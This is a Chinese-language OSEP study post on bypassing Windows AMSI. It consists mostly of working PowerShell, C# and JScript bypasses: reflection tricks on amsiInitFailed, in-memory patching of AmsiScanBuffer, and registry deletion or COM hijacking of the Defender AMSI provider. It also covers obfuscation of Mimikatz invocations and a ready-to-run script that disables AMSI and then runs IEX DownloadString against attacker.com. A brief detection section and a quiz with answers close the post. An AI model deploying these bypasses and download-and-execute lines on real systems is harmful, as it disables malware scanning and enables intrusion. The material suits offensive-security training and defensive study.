---
title: OSEP-08-AMSI绕过技术
description: '08-AMSI绕过 | 05-AMSI绕过技术'
pubDate: 2026-01-30T00:01:18+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# Module 08: 高级杀软绕过 - AMSI 绕过

## AMSI (Antimalware Scan Interface) 详解

AMSI 是 Windows 10 引入的安全机制，是 OSEP 考试的**必考内容**。

---

## 一、AMSI 概述

### 1.1 什么是 AMSI？

**AMSI (Antimalware Scan Interface)** 是微软提供的标准接口，允许应用程序将内容发送给已安装的杀毒软件进行扫描。

```
AMSI 工作流程:

PowerShell 脚本
      ↓
+------------------+
| PowerShell 引擎  |
+------------------+
      ↓ 调用 AMSI
+------------------+
| amsi.dll         |
+------------------+
      ↓
+------------------+
| 杀毒软件         |
| (Windows Defender)|
+------------------+
      ↓
扫描结果 (允许/阻止)
```

### 1.2 AMSI 保护的内容

| 组件 | 说明 |
|------|------|
| PowerShell | 脚本内容 |
| VBScript/JScript | WSH 脚本 |
| Office VBA | 宏代码 |
| .NET | 程序集加载 |
| WMI | WMI 脚本 |

### 1.3 AMSI 的关键函数

```c
// amsi.dll 导出的主要函数

// 初始化 AMSI 上下文
HRESULT AmsiInitialize(
    LPCWSTR appName,
    HAMSICONTEXT *amsiContext
);

// 打开会话
HRESULT AmsiOpenSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION *amsiSession
);

// 扫描缓冲区 (核心函数)
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);

// 扫描字符串
HRESULT AmsiScanString(
    HAMSICONTEXT amsiContext,
    LPCWSTR string,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

---

## 二、AMSI 绕过技术

### 2.1 方法一：修改 amsiInitFailed 标志

PowerShell 内部有一个标志 `amsiInitFailed`，如果设置为 `True`，AMSI 将被禁用。

```powershell
# 使用反射修改 amsiInitFailed
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$b = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
[IntPtr]$c = $b.GetValue($null)
[Int32[]]$d = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
```

**混淆版本**：

```powershell
# 字符串拼接绕过检测
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*si*tils"}
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Failed"}
$b.SetValue($null,$true)
```

### 2.2 方法二：Patch AmsiScanBuffer

直接修改 `AmsiScanBuffer` 函数，使其立即返回。

```powershell
# PowerShell 实现
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# 获取 AmsiScanBuffer 地址
$amsi = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($amsi, "AmsiScanBuffer")

# 修改内存保护
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)

# Patch: 返回 0 (AMSI_RESULT_CLEAN)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
```

**Patch 字节解释**：
```nasm
B8 57 00 07 80    mov eax, 0x80070057  ; E_INVALIDARG
C3                ret                   ; 返回
```

### 2.3 方法三：C# 实现 AMSI Patch

```csharp
using System;
using System.Runtime.InteropServices;

class AmsiBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch()
    {
        // 加载 amsi.dll
        IntPtr amsi = LoadLibrary("amsi.dll");
        if (amsi == IntPtr.Zero)
        {
            Console.WriteLine("[-] 无法加载 amsi.dll");
            return;
        }

        // 获取 AmsiScanBuffer 地址
        IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        if (amsiScanBuffer == IntPtr.Zero)
        {
            Console.WriteLine("[-] 无法获取 AmsiScanBuffer 地址");
            return;
        }

        Console.WriteLine($"[+] AmsiScanBuffer 地址: 0x{amsiScanBuffer.ToInt64():X}");

        // 修改内存保护为可写
        uint oldProtect;
        bool success = VirtualProtect(amsiScanBuffer, (UIntPtr)6, 0x40, out oldProtect);
        if (!success)
        {
            Console.WriteLine("[-] VirtualProtect 失败");
            return;
        }

        // Patch 字节
        // mov eax, 0x80070057 (E_INVALIDARG)
        // ret
        byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        // 写入 patch
        Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

        Console.WriteLine("[+] AMSI 已被 Patch");

        // 恢复内存保护
        VirtualProtect(amsiScanBuffer, (UIntPtr)6, oldProtect, out oldProtect);
    }
}
```

### 2.4 方法四：使用硬件断点

```csharp
// 使用硬件断点绕过 AMSI
// 在 AmsiScanBuffer 设置断点，修改返回值

// 这是一种更高级的技术，需要：
// 1. 设置硬件断点在 AmsiScanBuffer
// 2. 捕获异常
// 3. 修改返回值
// 4. 继续执行
```

---

## 三、JScript 中的 AMSI 绕过

### 3.1 注册表方法

```javascript
// 通过注册表禁用 AMSI 提供程序
var shell = new ActiveXObject("WScript.Shell");

// 删除 Windows Defender AMSI 提供程序
try {
    shell.RegDelete("HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\\");
} catch(e) {
    // 需要管理员权限
}
```

### 3.2 COM 劫持方法

```javascript
// 通过 COM 劫持绕过 AMSI
// 创建一个假的 AMSI 提供程序

var shell = new ActiveXObject("WScript.Shell");

// 在 HKCU 创建劫持键
shell.RegWrite("HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\", "C:\\Windows\\System32\\amsi.dll", "REG_SZ");
shell.RegWrite("HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\ThreadingModel", "Both", "REG_SZ");
```

---

## 四、混淆技术

### 4.1 字符串混淆

```powershell
# 原始命令 (会被检测)
Invoke-Mimikatz

# 字符串拼接
$a = "Inv"
$b = "oke-"
$c = "Mimi"
$d = "katz"
& ($a + $b + $c + $d)

# 字符替换
$cmd = "Invoke-Mimikatz" -replace "Mimikatz", "Mimikatz"
& $cmd

# Base64 编码
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz"))
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))

# 字符数组
$chars = [char[]]@(73,110,118,111,107,101,45,77,105,109,105,107,97,116,122)
$cmd = -join $chars
& $cmd
```

### 4.2 变量名混淆

```powershell
# 原始代码
$WebClient = New-Object Net.WebClient
$WebClient.DownloadString("http://attacker.com/script.ps1")

# 混淆后
${aaaa} = New-Object Net.WebClient
${aaaa}.DownloadString("http://attacker.com/script.ps1")

# 或使用随机变量名
$([char]0x57+[char]0x65+[char]0x62) = New-Object Net.WebClient
```

### 4.3 命令混淆

```powershell
# 使用 Invoke-Obfuscation 工具
# https://github.com/danielbohannon/Invoke-Obfuscation

# 示例输出
& ((GV '*MDR*').NaMe[3,11,2]-JoIN'') (NEw-ObjEct  sYSTEM.iO.COMprEsSIon.dEfLAtESTrEam([sYstEM.io.mEMORYSTREAM][SYsTEM.cOnVeRT]::fROMbASe64sTRIng('...'),[sYsTEM.iO.cOMPRESSIon.cOMPrEsSIONMODE]::dECOMPRESs)|FOrEaCH{NEw-ObjEct  sYSTEM.iO.sTREAmREADer($_,[sYsTEM.tExt.eNCODIng]::asCii)}).rEaDTOeND()
```

---

## 五、实战演练

### 5.1 完整的 AMSI 绕过脚本

```powershell
# AMSI 绕过 + 下载执行

# 步骤 1: 绕过 AMSI
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
[IntPtr]$c=$b.GetValue($null)
[Int32[]]$d=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)

# 步骤 2: 下载并执行
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

### 5.2 一行式 AMSI 绕过

```powershell
# 方法 1
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法 2 (混淆)
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))); $b=$a.GetField('amsiInitFailed','NonPublic,Static'); $b.SetValue($null,$true)
```

---

## 六、检测与防御

### 6.1 检测 AMSI 绕过

```powershell
# 检查 AMSI 是否正常工作
$test = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
# 如果 AMSI 正常，这个字符串会被检测

# 检查 AmsiScanBuffer 是否被 patch
$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress amsi.dll AmsiScanBuffer),
    [Func[IntPtr,IntPtr,UInt32,IntPtr,IntPtr,[ref]Int32,Int32]]
)
# 检查函数开头字节
```

### 6.2 防御建议

1. **启用脚本块日志记录**
   ```powershell
   # 组策略: 计算机配置 → 管理模板 → Windows 组件 → Windows PowerShell
   # 启用 "打开 PowerShell 脚本块日志记录"
   ```

2. **使用 Constrained Language Mode**
   ```powershell
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
   ```

3. **监控 AMSI 相关事件**
   - Event ID 1116: AMSI 检测到恶意内容
   - Event ID 1117: AMSI 阻止了恶意内容

---

## 七、章节测试

### 选择题

1. AMSI 的全称是？
   - A) Advanced Malware Scan Interface
   - B) Antimalware Scan Interface
   - C) Application Malware Security Interface
   - D) Automated Malware Scanning Interface

2. 以下哪个不受 AMSI 保护？
   - A) PowerShell
   - B) VBScript
   - C) 编译的 C++ 程序
   - D) Office VBA

3. `AmsiScanBuffer` 返回 `E_INVALIDARG` 的十六进制值是？
   - A) 0x00000000
   - B) 0x80070057
   - C) 0xFFFFFFFF
   - D) 0x00000001

4. 修改 `amsiInitFailed` 标志需要使用什么技术？
   - A) 文件操作
   - B) 反射
   - C) 网络请求
   - D) 注册表操作

5. 以下哪种方法不能绕过 AMSI？
   - A) Patch AmsiScanBuffer
   - B) 修改 amsiInitFailed
   - C) 删除 amsi.dll
   - D) COM 劫持

### 实践题

1. 解释 AMSI 的工作原理，以及为什么它对 PowerShell 攻击有效。

2. 编写一个混淆的 PowerShell 命令，执行 `whoami`。

### 答案

**选择题**：1-B, 2-C, 3-B, 4-B, 5-C

**实践题参考答案**：

1. AMSI 工作原理：
   - PowerShell 引擎在执行脚本前调用 AMSI
   - AMSI 将脚本内容发送给杀毒软件扫描
   - 杀毒软件返回扫描结果
   - 如果检测到恶意内容，脚本被阻止执行
   - 对 PowerShell 攻击有效是因为它能扫描解混淆后的实际代码

2. 混淆的 whoami：
```powershell
# 方法 1: 字符拼接
& ($([char]119)+$([char]104)+$([char]111)+$([char]97)+$([char]109)+$([char]105))

# 方法 2: Base64
IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('d2hvYW1p')))

# 方法 3: 变量替换
$a='who'; $b='ami'; & "$a$b"
```

---

**下一章**：[Module 09: 应用白名单绕过](/blog/osep/09-应用白名单绕过/01-applocker基础与绕过完整指南/)
